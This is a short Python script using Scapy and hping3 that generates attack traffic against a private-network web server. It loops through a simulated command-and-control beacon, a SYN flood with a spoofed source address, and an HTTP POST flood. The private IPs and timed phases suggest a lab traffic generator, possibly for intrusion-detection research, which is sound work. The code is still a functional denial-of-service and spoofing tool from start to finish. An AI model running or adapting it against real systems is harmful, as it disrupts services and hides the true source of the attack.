from scapy.all import *
import subprocess, time, sys

load_layer("http")
now = time.perf_counter()
time.sleep(30)

# -c: Numero de pacotes enviados.
c = 100
# -i: Taxa de envio (u20000 = 20 pacotes por segundo).
i = "u20000"
font_ip = "172.20.1.3"
# -a: Endereço de spoof.
target_ip = "172.20.1.2"
# -p: Porta de destino.
target_port = 80
mac = "ce:a9:65:80:50:6e"
# -S: Flag utilizada no ataque (SYN).

getStr = 'GET /beacon.php HTTP/1.1\r\n'
http_request_packet = Ether() / IP(src=font_ip, dst=target_ip) / TCP(dport=target_port, flags="S") / getStr

sendStr = 'POST /frasao HTTP/1.1\r\n'
http_post_packet = Ether() / IP(src=font_ip, dst=target_ip) / TCP(dport=target_port, flags=None) / sendStr

for j in range(30):
    
    print("-"*100)
    print("-"*39, "Command and Control", "-"*40)
    print("-"*100)
    sendp(http_request_packet)
    sys.stdout.write(f'Tempo: {(time.perf_counter()-now):.2f}s\n')
    time.sleep(10)
    
    print("-"*100)
    print("-"*44, "SYN Flood", "-"*45)
    print("-"*100)
    subprocess.call(f'hping3 -c {c} -p {target_port} -i {i} -S -a {font_ip} {target_ip}', shell=True)
    sys.stdout.write(f'Tempo: {(time.perf_counter()-now):.2f}s\n')
    time.sleep(10)
    
    print("-"*100)
    print("-"*44, "HTTP Flood", "-"*44)
    print("-"*100)
    sendp(http_post_packet, count=100)
    sys.stdout.write(f'Tempo: {(time.perf_counter()-now):.2f}s\n')
    time.sleep(10)
